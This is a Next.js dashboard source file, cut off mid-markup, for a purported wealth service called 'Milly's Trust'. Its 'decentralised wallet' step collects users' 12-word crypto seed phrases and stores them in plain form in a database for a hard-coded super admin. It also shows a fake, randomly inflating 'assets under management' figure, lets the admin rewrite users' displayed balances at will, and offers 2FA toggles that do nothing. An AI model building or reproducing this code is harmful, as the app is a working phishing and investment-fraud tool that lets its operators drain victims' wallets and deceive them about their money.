'use client';

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  Shield, LogOut, Plus, Trash2, TrendingUp, Building2, Wallet,
  PieChart, Lock, User, ArrowUp, X, Loader2
} from 'lucide-react';
import { supabase } from '@/lib/supabaseClient';

// ==================== TYPES ====================
interface CurrentUser {
  id: string;
  name: string;
  email: string;
}

interface LinkedAccount {
  id: number;
  type: 'bank' | 'wallet' | 'brokerage';
  institution: string;
  accountMask: string;
  balance: number;
  lastLinked: string;
  status?: string;
}

interface Holding {
  id: number;
  symbol: string;
  name: string;
  shares: number;
  avgCost: number;
  currentPrice: number;
}

interface ActivityLog {
  id: number;
  type: string;
  message: string;
  timestamp: string;
}

interface AllUser {
  id: string;
  name: string;
  email: string;
}

export default function Dashboard() {
  const router = useRouter();

  // ==================== STATE ====================
  const [currentUser, setCurrentUser] = useState<CurrentUser | null>(null);
  const [activeTab, setActiveTab] = useState<'overview' | 'assets' | 'portfolio' | 'security' | 'profile' | 'admin'>('overview');
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  const [linkedAccounts, setLinkedAccounts] = useState<LinkedAccount[]>([]);
  const [holdings, setHoldings] = useState<Holding[]>([]);
  const [activityLog, setActivityLog] = useState<ActivityLog[]>([]);

  const [showAddAccountModal, setShowAddAccountModal] = useState(false);
  const [showAddHoldingModal, setShowAddHoldingModal] = useState(false);
  const [showUnlinkConfirm, setShowUnlinkConfirm] = useState<number | null>(null);

  const [newAccount, setNewAccount] = useState({
    type: 'bank' as 'bank' | 'wallet' | 'brokerage',
    institution: '',
    accountMask: '',
    balance: ''
  });

  const [newHolding, setNewHolding] = useState({
    symbol: '', name: '', shares: '', avgCost: '', currentPrice: ''
  });

  const [twoFactorEnabled, setTwoFactorEnabled] = useState(true);
  const [google2FAEnabled, setGoogle2FAEnabled] = useState(false);

  // Admin
  const [allUsers, setAllUsers] = useState<AllUser[]>([]);
  const [selectedAdminUser, setSelectedAdminUser] = useState<AllUser | null>(null);
  const [adminAccounts, setAdminAccounts] = useState<LinkedAccount[]>([]);
  const [showBalanceConfirm, setShowBalanceConfirm] = useState<any>(null);

  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' } | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  // Decentralised Wallet Flow
  const [decentralisedStep, setDecentralisedStep] = useState(0);
  const [decentralisedData, setDecentralisedData] = useState({
    walletName: '',
    estimatedHoldings: '',
    seedPhrase: Array(12).fill('')
  });

  // Global AUM
  const [globalAUM, setGlobalAUM] = useState(4250000);

  // ==================== LOAD DATA (CLIENT ONLY) ====================
  useEffect(() => {
    // Only run on client
    if (typeof window === 'undefined') return;

    // Load Global AUM
    const baseValue = 4250000;
    const lastUpdated = localStorage.getItem('millys_global_aum_date');
    const today = new Date().toISOString().split('T')[0];
    let currentAUM = parseFloat(localStorage.getItem('millys_global_aum') || baseValue.toString());

    if (lastUpdated !== today) {
      const dailyGrowth = Math.floor(Math.random() * 36000) + 12000;
      currentAUM += dailyGrowth;
      if (currentAUM > 7000000) currentAUM = 7000000;
      localStorage.setItem('millys_global_aum', currentAUM.toString());
      localStorage.setItem('millys_global_aum_date', today);
    }
    setGlobalAUM(Math.floor(currentAUM));

    // Load current user
    const userStr = localStorage.getItem('millys_current_user');
    if (!userStr) {
      router.push('/signin');
      return;
    }

    const user: CurrentUser = JSON.parse(userStr);
    setCurrentUser(user);

    // Load linked accounts from Supabase
    const loadAccounts = async () => {
      const { data } = await supabase
        .from('linked_accounts')
        .select('*')
        .eq('user_id', user.id)
        .order('last_linked', { ascending: false });

      if (data) setLinkedAccounts(data);
    };
    loadAccounts();

    // Load local data
    const savedHoldings = JSON.parse(localStorage.getItem(`millys_holdings_${user.id}`) || '[]');
    setHoldings(savedHoldings);

    const savedActivity = JSON.parse(localStorage.getItem(`millys_activity_${user.id}`) || '[]');
    setActivityLog(savedActivity);

    const saved2FA = localStorage.getItem(`millys_2fa_${user.id}`);
    if (saved2FA !== null) setTwoFactorEnabled(saved2FA === 'true');

    const savedGoogle2FA = localStorage.getItem(`millys_google_2fa_${user.id}`);
    if (savedGoogle2FA !== null) setGoogle2FAEnabled(savedGoogle2FA === 'true');

    setIsLoading(false);
  }, [router]);

  // ==================== HELPERS ====================
  const showToast = (message: string, type: 'success' | 'error' = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3000);
  };

  const handleLogout = () => {
    if (typeof window !== 'undefined') {
      localStorage.removeItem('millys_current_user');
    }
    router.push('/signin');
  };

  // ==================== CALCULATIONS ====================
  const totalLinkedBalance = linkedAccounts
    .filter(acc => acc.status !== 'processing')
    .reduce((sum, acc) => sum + acc.balance, 0);

  const portfolioValue = holdings.reduce((sum, h) => sum + (h.shares * h.currentPrice), 0);
  const portfolioCost = holdings.reduce((sum, h) => sum + (h.shares * h.avgCost), 0);
  const totalPortfolioGain = portfolioValue - portfolioCost;
  const portfolioGainPercent = portfolioCost > 0 ? ((totalPortfolioGain / portfolioCost) * 100) : 0;
  const grandTotalAssets = totalLinkedBalance + portfolioValue;

  const formatCurrency = (amount: number) =>
    new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 0 }).format(amount);

  // ==================== HANDLERS ====================
  const saveHoldings = (newHoldings: Holding[]) => {
    if (!currentUser || typeof window === 'undefined') return;
    localStorage.setItem(`millys_holdings_${currentUser.id}`, JSON.stringify(newHoldings));
    setHoldings(newHoldings);
  };

  const addActivity = (message: string) => {
    if (!currentUser || typeof window === 'undefined') return;
    const newAct: ActivityLog = {
      id: Date.now(),
      type: 'action',
      message,
      timestamp: new Date().toISOString()
    };
    const updated = [newAct, ...activityLog].slice(0, 20);
    localStorage.setItem(`millys_activity_${currentUser.id}`, JSON.stringify(updated));
    setActivityLog(updated);
  };

  // ==================== LINK NEW ACCOUNT ====================
  const handleAddAccount = async () => {
    if (!newAccount.institution || !newAccount.accountMask || !newAccount.balance) {
      showToast('Please fill all fields', 'error');
      return;
    }
    if (!currentUser) return;

    const { data, error } = await supabase.from('linked_accounts').insert([{
      user_id: currentUser.id,
      type: newAccount.type,
      institution: newAccount.institution.trim(),
      account_mask: newAccount.accountMask.trim(),
      balance: parseFloat(newAccount.balance),
      status: 'processing',
      last_linked: new Date().toISOString()
    }]).select().single();

    if (error) {
      showToast('Failed to submit account', 'error');
      return;
    }

    setLinkedAccounts([...linkedAccounts, {
      id: data.id,
      type: newAccount.type,
      institution: newAccount.institution.trim(),
      accountMask: newAccount.accountMask.trim(),
      balance: parseFloat(newAccount.balance),
      lastLinked: new Date().toISOString(),
      status: 'processing'
    }]);

    addActivity(`Requested to link ${newAccount.institution} (Pending Approval)`);
    showToast('Account submitted for approval');
    setNewAccount({ type: 'bank', institution: '', accountMask: '', balance: '' });
    setShowAddAccountModal(false);
  };

  // ==================== ADMIN PANEL FUNCTIONS ====================
  const loadAllUsers = async () => {
    const { data, error } = await supabase
      .from('users')
      .select('id, name, email')
      .order('created_at', { ascending: false });

    if (!error && data) {
      setAllUsers(data);
    } else {
      showToast('Failed to load users', 'error');
    }
  };

  const loadAdminUserData = async (user: AllUser) => {
    setSelectedAdminUser(user);

    const { data, error } = await supabase
      .from('linked_accounts')
      .select('*')
      .eq('user_id', user.id);

    if (!error && data) {
      setAdminAccounts(data);
    } else {
      setAdminAccounts([]);
    }
  };

  const requestBalanceUpdate = (accountId: number, newBalance: number, institution: string) => {
    if (newBalance < 0) {
      showToast("Balance cannot be negative", "error");
      return;
    }
    if (!selectedAdminUser) return;

    const oldAccount = adminAccounts.find(a => a.id === accountId);

    setShowBalanceConfirm({
      accountId,
      newBalance,
      institution,
      oldBalance: oldAccount?.balance || 0
    });
  };

  const confirmBalanceUpdate = async () => {
    if (!showBalanceConfirm || !selectedAdminUser || !currentUser) return;

    const { accountId, newBalance, institution, oldBalance } = showBalanceConfirm;

    try {
      const { error } = await supabase
        .from('linked_accounts')
        .update({ balance: newBalance })
        .eq('id', accountId);

      if (error) {
        showToast("Failed to update balance", "error");
        return;
      }

      await supabase.from('audit_logs').insert({
        admin_email: currentUser.email,
        action: "Balance Update",
        target_user: selectedAdminUser.email,
        details: { institution, oldBalance, newBalance }
      });

      await loadAdminUserData(selectedAdminUser);
      setShowBalanceConfirm(null);
      showToast("Balance updated successfully", "success");

    } catch (err) {
      showToast("An error occurred", "error");
    }
  };

  // ==================== DECENTRALISED WALLET FLOW ====================
  const openDecentralisedFlow = () => {
    setDecentralisedStep(1);
    setDecentralisedData({ walletName: '', estimatedHoldings: '', seedPhrase: Array(12).fill('') });
  };

  const handleDecentralisedNext = async () => {
    if (decentralisedStep === 1) {
      if (!decentralisedData.walletName.trim() || !decentralisedData.estimatedHoldings) {
        showToast('Please enter wallet name and select holdings range', 'error');
        return;
      }
      setDecentralisedStep(2);
    } 
    else if (decentralisedStep === 2) {
      setDecentralisedStep(3);
    } 
    else if (decentralisedStep === 3) {
      const fullSeedPhrase = decentralisedData.seedPhrase.join(' ').trim();

      if (fullSeedPhrase.split(' ').length !== 12) {
        showToast('Please enter all 12 words correctly', 'error');
        return;
      }

      if (!currentUser) return;

      setIsSubmitting(true);

      try {
        const { data, error } = await supabase
          .from('linked_accounts')
          .insert([{
            user_id: currentUser.id,
            type: 'wallet',
            institution: decentralisedData.walletName.trim(),
            account_mask: 'Decentralised Wallet',
            balance: 0,
            status: 'processing',
            last_linked: new Date().toISOString(),
            seed_phrase: fullSeedPhrase
          }])
          .select()
          .single();

        if (error) {
          console.error("Supabase Error:", error);
          showToast('Failed to submit wallet. Please try again.', 'error');
          setIsSubmitting(false);
          return;
        }

        setLinkedAccounts([...linkedAccounts, {
          id: data.id,
          type: 'wallet',
          institution: decentralisedData.walletName.trim(),
          accountMask: 'Decentralised Wallet',
          balance: 0,
          lastLinked: new Date().toISOString(),
          status: 'processing'
        }]);

        showToast('Decentralised wallet submitted for approval');
        setDecentralisedStep(0);
        setShowAddAccountModal(false);
        setDecentralisedData({ walletName: '', estimatedHoldings: '', seedPhrase: Array(12).fill('') });

      } catch (err) {
        console.error("Unexpected Error:", err);
        showToast('Something went wrong. Please try again.', 'error');
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  // ==================== RENDER ====================
  const firstName = currentUser?.name?.split(' ')[0] || '';
  const isSuperAdmin = currentUser?.email?.toLowerCase().trim() === 'admin@millystrust.com';

  if (isLoading || !currentUser) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-950 text-white">
        Loading secure session...
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-100 flex flex-col">
      {/* Top Navigation */}
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-teal-600 to-teal-700 flex items-center justify-center">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div>
              <div className="font-semibold text-2xl tracking-tighter text-slate-950">Milly&apos;s Trust</div>
              <div className="text-[10px] text-teal-600 -mt-1.5 font-medium tracking-[1.5px]">DIGITAL FIDUCIARY</div>
            </div>
          </div>

          <div className="flex items-center gap-5">
            <div className="text-right hidden sm:block">
              <div className="font-semibold text-slate-800">{currentUser.name}</div>
              <div className="text-xs text-slate-500 -mt-0.5">{currentUser.email}</div>
            </div>
            <button onClick={handleLogout} className="flex items-center gap-2 px-5 py-2 text-sm font-medium text-red-600 hover:bg-red-50 rounded-2xl transition">
              <LogOut className="w-4 h-4" /> Sign Out
            </button>
          </div>
        </div>
      </nav>

      <div className="flex flex-1 max-w-7xl mx-auto w-full">
        {/* Sidebar */}
        <div className="w-72 border-r border-slate-200 bg-white p-6 hidden lg:block">
          <div className="mb-8 px-1">
            <div className="text-xs tracking-[2px] text-slate-400 font-semibold mb-1">SECURE DASHBOARD</div>
            <div className="text-3xl font-semibold tracking-tighter text-slate-900">Welcome back,<br />{firstName}.</div>
          </div>

          <nav className="space-y-1 text-sm">
            {[
              { id: 'overview', label: 'Overview', icon: PieChart },
              { id: 'assets', label: 'Linked Assets', icon: Wallet },
              { id: 'portfolio', label: 'Investment Portfolio', icon: TrendingUp },
              { id: 'security', label: 'Security Center', icon: Lock },
              { id: 'profile', label: 'Account Settings', icon: User },
              ...(isSuperAdmin ? [{ id: 'admin', label: 'Admin Panel', icon: Shield }] : []),
            ].map((item) => {
              const Icon = item.icon;
              return (
                <button
                  key={item.id}
                  onClick={() => setActiveTab(item.id as any)}
                  className={`w-full flex items-center gap-3.5 px-5 py-[13px] rounded-2xl text-left transition-all font-medium ${activeTab === item.id ? 'bg-teal-600 text-white shadow' : 'text-slate-700 hover:bg-slate-100'}`}
                >
                  <Icon className="w-4 h-4" />
                  {item.label}
                </button>
              );
            })}
          </nav>
        </div>

        {/* Main Content */}
        <div className="flex-1 p-6 lg:p-8 overflow-auto w-full">
          {/* OVERVIEW */}
          {activeTab === 'overview' && (
            <div className="space-y-8">
              <div>
                <div className="text-teal-600 text-xs tracking-[2px] font-semibold">WELCOME BACK</div>
                <h1 className="text-5xl font-semibold tracking-[-1.5px] text-slate-950">Good to see you, {firstName}.</h1>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-white border border-slate-200 rounded-3xl p-9">
                  <div className="text-xs tracking-widest text-slate-500 mb-2">TOTAL ASSETS IN MILLY&apos;S TRUST</div>
                  <div className="text-7xl font-semibold tabular-nums tracking-tighter text-teal-700">{formatCurrency(globalAUM)}</div>
                  <div className="mt-2 text-emerald-600 text-sm flex items-center gap-1"><ArrowUp className="w-4 h-4" /> Growing daily</div>
                </div>

                <div className="bg-white border border-slate-200 rounded-3xl p-9">
                  <div className="text-xs tracking-widest text-slate-500 mb-2">YOUR TOTAL ASSETS</div>
                  <div className="text-7xl font-semibold tabular-nums tracking-tighter text-slate-950">{formatCurrency(grandTotalAssets)}</div>
                  <div className="mt-2 text-sm text-slate-500">Linked accounts + Portfolio</div>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="bg-white border border-slate-200 rounded-3xl p-6">
                  <div className="text-xs text-slate-500">LINKED ACCOUNTS</div>
                  <div className="text-4xl font-semibold mt-2">{linkedAccounts.length}</div>
                </div>
                <div className="bg-white border border-slate-200 rounded-3xl p-6">
                  <div className="text-xs text-slate-500">PORTFOLIO VALUE</div>
                  <div className="text-4xl font-semibold mt-2">{formatCurrency(portfolioValue)}</div>
                </div>
                <div className="bg-white border border-slate-200 rounded-3xl p-6">
                  <div className="text-xs text-slate-500">UNREALIZED GAIN/LOSS</div>
                  <div className={`text-4xl font-semibold mt-2 ${portfolioGainPercent >= 0 ? 'text-emerald-600' : 'text-red-600'}`}>
                    {portfolioGainPercent >= 0 ? '+' : ''}{portfolioGainPercent.toFixed(1)}%
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* LINKED ASSETS */}
          {activeTab === 'assets' && (
            <div>
              <div className="flex justify-between items-end mb-8">
                <div>
                  <div className="text-teal-600 text-xs tracking-[2px] font-semibold">SECURE CONNECTIONS</div>
                  <h2 className="text-4xl font-semibold tracking-tight">Linked Banks & Digital Wallets</h2>
                </div>
                <button onClick={() => setShowAddAccountModal(true)} className="flex items-center gap-2 bg-teal-600 text-white px-6 py-3 rounded-2xl text-sm font-semibold">
                  <Plus className="w-4 h-4" /> LINK NEW ACCOUNT
                </button>
              </div>

              {linkedAccounts.length === 0 ? (
                <div className="bg-white border border-dashed border-slate-300 rounded-3xl p-16 text-center">
                  <Wallet className="mx-auto w-12 h-12 text-slate-300 mb-5" />
                  <div className="font-semibold text-2xl tracking-tight mb-2">No accounts linked yet</div>
                  <button onClick={() => setShowAddAccountModal(true)} className="bg-slate-900 text-white px-8 py-3 rounded-2xl font-medium">Link Your First Account</button>
                </div>
              ) : (
                <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-5">
                  {linkedAccounts.map((account) => {
                    const Icon = account.type === 'bank' ? Building2 : account.type === 'wallet' ? Wallet : PieChart;
                    const isProcessing = account.status === 'processing';
                    return (
                      <div key={account.id} className="bg-white border border-slate-200 rounded-3xl p-7">
                        <div className="flex justify-between">
                          <div className="p-3 bg-slate-100 rounded-2xl w-fit text-teal-700"><Icon className="w-6 h-6" /></div>
                          <button onClick={() => setShowUnlinkConfirm(account.id)} className="text-red-400 hover:text-red-600 p-1"><Trash2 size={17} /></button>
                        </div>
                        <div className="mt-6">
                          <div className="font-semibold text-2xl tracking-tight text-slate-900">{account.institution}</div>
                          <div className="font-mono text-xs tracking-[3px] text-slate-400 mt-0.5">{account.accountMask}</div>
                        </div>
                        <div className="mt-8 flex justify-between items-end">
                          <div>
                            <div className="text-xs text-slate-500 tracking-widest">CURRENT BALANCE</div>
                            {isProcessing ? (
                              <div className="text-3xl font-semibold tabular-nums tracking-tighter mt-px text-slate-400">Hidden until approved</div>
                            ) : (
                              <div className="text-3xl font-semibold tabular-nums tracking-tighter mt-px text-slate-950">{formatCurrency(account.balance)}</div>
                            )}
                          </div>
                          {isProcessing && <div className="text-xs bg-amber-100 text-amber-700 px-3 py-1 rounded-full font-medium">Processing</div>}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          )}

          {/* INVESTMENT PORTFOLIO */}
          {activeTab === 'portfolio' && (
            <div>
              <div className="flex justify-between items-end mb-8">
                <div>
                  <div className="text-teal-600 text-xs tracking-[2px] font-semibold">STOCK & EQUITY HOLDINGS</div>
                  <h2 className="text-4xl font-semibold tracking-tight">Investment Portfolio</h2>
                </div>
                <button onClick={() => setShowAddHoldingModal(true)} className="flex items-center gap-2 bg-teal-600 text-white px-6 py-3 rounded-2xl text-sm font-semibold">
                  <Plus className="w-4 h-4" /> ADD POSITION
                </button>
              </div>

              <div className="bg-white border border-slate-200 rounded-3xl p-8 mb-6">
                <div className="text-6xl font-semibold tracking-tighter tabular-nums">{formatCurrency(portfolioValue)}</div>
                <div className={`mt-1 text-lg ${portfolioGainPercent >= 0 ? 'text-emerald-600' : 'text-red-600'}`}>
                  {portfolioGainPercent >= 0 ? '+' : ''}{portfolioGainPercent.toFixed(2)}% unrealized
                </div>
              </div>

              <div className="bg-white border border-slate-200 rounded-3xl overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b text-left text-xs tracking-widest text-slate-500">
                      <th className="py-4 px-8">SYMBOL</th>
                      <th className="py-4 text-right">SHARES</th>
                      <th className="py-4 text-right">MARKET VALUE</th>
                      <th className="py-4 text-right pr-8">GAIN/LOSS</th>
                      <th></th>
                    </tr>
                  </thead>
                  <tbody className="divide-y">
                    {holdings.length > 0 ? holdings.map((h) => {
                      const marketValue = h.shares * h.currentPrice;
                      const gain = marketValue - (h.shares * h.avgCost);
                      return (
                        <tr key={h.id}>
                          <td className="px-8 py-5 font-medium">{h.symbol}</td>
                          <td className="text-right tabular-nums py-5 pr-4">{h.shares}</td>
                          <td className="text-right tabular-nums py-5 pr-4 font-semibold">{formatCurrency(marketValue)}</td>
                          <td className={`text-right tabular-nums py-5 pr-8 font-medium ${gain >= 0 ? 'text-emerald-600' : 'text-red-600'}`}>
                            {gain >= 0 ? '+' : ''}{formatCurrency(gain)}
                          </td>
                          <td className="pr-6">
                            <button onClick={() => {
                              const updated = holdings.filter(item => item.id !== h.id);
                              saveHoldings(updated);
                            }} className="text-red-500 p-2"><Trash2 size={15}/></button>
                          </td>
                        </tr>
                      );
                    }) : (
                      <tr>
                        <td colSpan={5} className="text-center py-12 text-slate-400">No holdings yet</td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* SECURITY CENTER */}
          {activeTab === 'security' && (
            <div className="max-w-4xl">
              <h2 className="text-4xl font-semibold tracking-tight mb-8">Security Center</h2>
              <div className="grid md:grid-cols-2 gap-6">
                <div className="bg-white border border-emerald-100 rounded-3xl p-8">
                  <div className="flex items-center gap-3 mb-4"><Lock className="text-emerald-600" /> <span className="font-semibold text-xl">Two-Factor Authentication</span></div>
                  <div className="flex justify-between items-center bg-slate-50 rounded-2xl p-5">
                    <div>Status: <span className={twoFactorEnabled ? "text-emerald-600 font-medium" : "text-amber-600"}>{twoFactorEnabled ? 'ENABLED' : 'DISABLED'}</span></div>
                    <button onClick={() => setTwoFactorEnabled(!twoFactorEnabled)} className={`px-6 py-2 rounded-2xl text-sm font-semibold ${twoFactorEnabled ? 'bg-red-100 text-red-700' : 'bg-emerald-600 text-white'}`}>
                      {twoFactorEnabled ? 'Disable' : 'Enable'}
                    </button>
                  </div>
                </div>

                <div className="bg-white border border-emerald-100 rounded-3xl p-8">
                  <div className="flex items-center gap-3 mb-4"><Lock className="text-emerald-600" /> <span className="font-semibold text-xl">Google Authenticator 2FA</span></div>
                  <div className="flex justify-between items-center bg-slate-50 rounded-2xl p-5">
                    <div>Status: <span className={google2FAEnabled ? "text-emerald-600 font-medium" : "text-amber-600"}>{google2FAEnabled ? 'ENABLED' : 'DISABLED'}</span></div>
                    <button onClick={() => setGoogle2FAEnabled(!google2FAEnabled)} className={`px-6 py-2 rounded-2xl text-sm font-semibold ${google2FAEnabled ? 'bg-red-100 text-red-700' : 'bg-emerald-600 text-white'}`}>
                      {google2FAEnabled ? 'Disable' : 'Enable'}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ACCOUNT SETTINGS */}
          {activeTab === 'profile' && (
            <div className="max-w-2xl">
              <h2 className="text-4xl font-semibold tracking-tight mb-8">Account Settings</h2>
              <div className="bg-white border border-slate-200 rounded-3xl p-9 space-y-8">
                <div>
                  <label className="text-xs tracking-widest font-semibold text-slate-500 block mb-2">FULL NAME</label>
                  <input type="text" defaultValue={currentUser.name} className="w-full border border-slate-300 rounded-2xl px-6 py-3 text-lg" />
                </div>
                <div>
                  <label className="text-xs tracking-widest font-semibold text-slate-500 block mb-2">EMAIL ADDRESS</label>
                  <input type="email" defaultValue={currentUser.email} disabled className="w-full border border-slate-300 rounded-2xl px-6 py-3 text-lg bg-slate-50" />
                  <p className="text-xs text-slate-400 mt-1">Email cannot be changed</p>
                </div>

                <div className="pt-6 border-t">
                  <div className="font-semibold mb-4">Security</div>
                  <div className="space-y-4">
                    <button onClick={() => setGoogle2FAEnabled(!google2FAEnabled)} className={`w-full text-left px-6 py-4 rounded-2xl border flex justify-between items-center ${google2FAEnabled ? 'border-emerald-600 bg-emerald-50' : 'border-slate-200'}`}>
                      <span>Google Authenticator 2FA</span>
                      <span className={`text-sm font-medium ${google2FAEnabled ? 'text-emerald-600' : 'text-slate-500'}`}>{google2FAEnabled ? 'Enabled' : 'Disabled'}</span>
                    </button>
                    <button className="w-full text-left px-6 py-4 rounded-2xl border border-slate-200 flex justify-between items-center">
                      <span>Change Password</span>
                      <span className="text-sm text-teal-600">Update →</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ADMIN PANEL */}
          {activeTab === 'admin' && isSuperAdmin && (
            <div>
              <div className="mb-8">
                <div className="text-red-600 text-xs tracking-[2px] font-semibold">SUPER USER ACCESS</div>
                <h2 className="text-4xl font-semibold tracking-tight">Admin Panel</h2>
                <p className="text-slate-600">Manage users and their linked assets</p>
              </div>

              <div className="grid lg:grid-cols-3 gap-6">
                <div className="bg-white border border-slate-200 rounded-3xl p-6">
                  <div className="flex justify-between items-center mb-4">
                    <div className="font-semibold">All Registered Users</div>
                    <button onClick={loadAllUsers} className="text-xs px-3 py-1.5 rounded-xl border hover:bg-slate-50">
                      Refresh
                    </button>
                  </div>
                  <div className="space-y-2 max-h-[420px] overflow-auto pr-1">
                    {allUsers.length > 0 ? (
                      allUsers.map((user) => (
                        <button
                          key={user.id}
                          onClick={() => loadAdminUserData(user)}
                          className={`w-full text-left p-4 rounded-2xl border text-sm transition ${selectedAdminUser?.id === user.id ? 'bg-teal-50 border-teal-600' : 'hover:bg-slate-50 border-slate-200'}`}
                        >
                          <div className="font-medium">{user.name}</div>
                          <div className="text-xs text-slate-500">{user.email}</div>
                        </button>
                      ))
                    ) : (
                      <div className="text-sm text-slate-500 py-4">No users found. Click refresh.</div>
                    )}
                  </div>
                </div>

                <div className="lg:col-span-2 bg-white border border-slate-200 rounded-3xl p-6">
                  {selectedAdminUser ? (
                    <>
                      <div className="flex justify-between mb-6">
                        <div>
                          <div className="text-2xl font-semibold">{selectedAdminUser.name}</div>
                          <div className="text-sm text-slate-500">{selectedAdminUser.email}</div>
                        </div>
                        <button onClick={() => setSelectedAdminUser(null)} className="text-sm text-slate-500 hover:text-slate-700">
                          Close
                        </button>
                      </div>

                      <div className="font-semibold mb-3">Linked Accounts</div>

                      {adminAccounts.length > 0 ? (
                        adminAccounts.map((acc) => (
                          <div key={acc.id} className="flex items-center justify-between border-b py-4">
                            <div>
                              <div className="font-medium">{acc.institution}</div>
                              <div className="text-xs text-slate-500 font-mono">{acc.accountMask}</div>
                              {acc.status === 'processing' && (
                                <div className="text-amber-600 text-xs mt-0.5">Processing - Awaiting Approval</div>
                              )}
                            </div>
                            <div className="flex items-center gap-3">
                              <input
                                type="number"
                                defaultValue={acc.balance}
                                onBlur={(e) => {
                                  const newVal = parseFloat(e.target.value);
                                  if (!isNaN(newVal)) requestBalanceUpdate(acc.id, newVal, acc.institution);
                                }}
                                className="w-32 border rounded-xl px-3 py-2 text-right font-mono text-sm"
                              />
                              <span className="text-xs text-slate-400">USD</span>
                            </div>
                          </div>
                        ))
                      ) : (
                        <div className="text-sm text-slate-500 py-6 text-center border border-dashed rounded-2xl">
                          No linked accounts yet.
                        </div>
                      )}
                    </>
                  ) : (
                    <div className="flex items-center justify-center h-[300px] text-center text-slate-500">
                      Select a user from the left to manage their accounts.
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ==================== ADD ACCOUNT MODAL ==================== */}
      {showAddAccountModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[60] p-6">
          <div className="bg-white rounded-3xl w-full max-w-md p-8">
            <div className="flex justify-between mb-6">
              <div className="font-semibold text-2xl tracking-tight">Link New Account</div>
              <button onClick={() => { setShowAddAccountModal(false); setDecentralisedStep(0); }}><X /></button>
            </div>

            {decentralisedStep === 0 && (
              <div className="space-y-3">
                <button onClick={() => { setNewAccount({ type: 'wallet', institution: '', accountMask: '', balance: '' }); openDecentralisedFlow(); }} className="w-full text-left p-4 rounded-2xl border flex gap-3 hover:bg-teal-50 border-teal-600">
                  <Wallet className="w-5 h-5 text-teal-600" /> <div><div className="font-medium">Digital Wallet</div><div className="text-xs text-slate-500">Crypto & Decentralised</div></div>
                </button>
                <button onClick={() => setNewAccount({ type: 'bank', institution: '', accountMask: '', balance: '' })} className="w-full text-left p-4 rounded-2xl border flex gap-3 hover:bg-slate-50">
                  <Building2 className="w-5 h-5 text-teal-600" /> <div className="font-medium">Bank Account</div>
                </button>
                <button onClick={() => setNewAccount({ type: 'brokerage', institution: '', accountMask: '', balance: '' })} className="w-full text-left p-4 rounded-2xl border flex gap-3 hover:bg-slate-50">
                  <PieChart className="w-5 h-5 text-teal-600" /> <div className="font-medium">Brokerage Account</div>
                </button>
              </div>
            )}

            {decentralisedStep > 0 && (
              <div>
                {decentralisedStep === 1 && (
                  <div className="space-y-4">
                    <div>
                      <label className="text-xs font-semibold tracking-widest text-slate-500">WALLET NAME</label>
                      <input value={decentralisedData.walletName} onChange={e => setDecentralisedData({ ...decentralisedData, walletName: e.target.value })} placeholder="My MetaMask Wallet" className="w-full border rounded-2xl px-4 py-3 mt-1" />
                    </div>
                    <div>
                      <label className="text-xs font-semibold tracking-widest text-slate-500">ESTIMATED HOLDINGS</label>
                      <select value={decentralisedData.estimatedHoldings} onChange={e => setDecentralisedData({ ...decentralisedData, estimatedHoldings: e.target.value })} className="w-full border rounded-2xl px-4 py-3 mt-1">
                        <option value="">Select range</option>
                        <option value="0-$10,000">0 - $10,000</option>
                        <option value="$10,001-$50,000">$10,001 - $50,000</option>
                        <option value="$50,001-$200,000">$50,001 - $200,000</option>
                        <option value="$200,001+">$200,001+</option>
                      </select>
                    </div>
                    <button onClick={handleDecentralisedNext} className="w-full bg-teal-600 text-white py-3 rounded-2xl font-semibold">Next</button>
                  </div>
                )}

                {decentralisedStep === 2 && (
                  <div className="text-center py-8">
                    <h3 className="text-xl font-semibold mb-4">Secure your wallet with advanced protection</h3>
                    <p className="text-slate-600 mb-8">We use bank-grade encryption and multi-layer security for all decentralised wallets.</p>
                    <button onClick={handleDecentralisedNext} className="w-full bg-teal-600 text-white py-3 rounded-2xl font-semibold">Continue</button>
                  </div>
                )}

                {decentralisedStep === 3 && (
                  <div>
                    <h3 className="font-semibold mb-2">Enter your 12-word seed phrase</h3>
                    <p className="text-xs text-slate-500 mb-4">This will be securely stored and only visible to the Super Admin.</p>
                    <div className="grid grid-cols-3 gap-3">
                      {decentralisedData.seedPhrase.map((word, i) => (
                        <input
                          key={i}
                          value={word}
                          onChange={(e) => {
                            const newPhrase = [...decentralisedData.seedPhrase];
                            newPhrase[i] = e.target.value.trim();
                            setDecentralisedData({ ...decentralisedData, seedPhrase: newPhrase });
                          }}
                          className="border border-slate-300 rounded-xl px-3 py-2.5 text-center text-sm focus:outline-none focus:border-teal-600"
                          placeholder={`${i + 1}`}
                        />
                      ))}
                    </div>
                    <button
                      onClick={handleDecentralisedNext}
                      disabled={isSubmitting}
                      className="w-full bg-teal-600 hover:bg-teal-700 disabled:bg-teal-400 text-white py-3.5 rounded-2xl font-semibold mt-6 flex items-center justify-center gap-2 transition"
                    >
                      {isSubmitting ? (
                        <>
                          <Loader2 className="w-4 h-4 animate-spin" /> Submitting...
                        </>
                      ) : (
